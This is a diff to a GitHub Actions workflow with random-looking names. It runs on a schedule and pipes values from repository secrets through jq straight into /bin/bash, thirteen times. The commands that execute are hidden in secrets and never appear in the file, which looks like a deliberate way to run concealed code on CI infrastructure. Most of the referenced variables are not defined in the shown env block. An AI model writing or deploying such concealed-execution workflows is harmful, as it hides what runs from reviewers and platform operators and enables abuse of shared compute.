@@ -2,7 +2,7 @@ name: hubinyan2009
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 4/6 * * *'
+    - cron: '39 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,8 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: hubinyan2009
         env:
-          xckz4: ${{ secrets.xckz4 }}
+          ehopj050: ${{ secrets.ehopj050 }}
         run: |
-          echo $xckz4 | jq -r .hsns7468 | /bin/bash
-          echo $au01395 | jq -r .vak456 | /bin/bash
+          echo $ehopj050 | jq -r .oe2443 | /bin/bash
+          echo $lufup34 | jq -r .txbn41678 | /bin/bash
+          echo $mu125 | jq -r .yskx662 | /bin/bash
+          echo $tnd55265 | jq -r .k15 | /bin/bash
+          echo $xyf248 | jq -r .giy97 | /bin/bash
+          echo $ej55230 | jq -r .truje045 | /bin/bash
+          echo $rylu93 | jq -r .xvmd88 | /bin/bash
+          echo $yol15149 | jq -r .ccqfv92 | /bin/bash
+          echo $b394 | jq -r .dhlhk97385 | /bin/bash
+          echo $gdzk32 | jq -r .bqfyl952 | /bin/bash
+          echo $blvq3 | jq -r .oi87 | /bin/bash
+          echo $s19259 | jq -r .k14 | /bin/bash
+          echo $xjyg05851 | jq -r .u7750 | /bin/bash
 
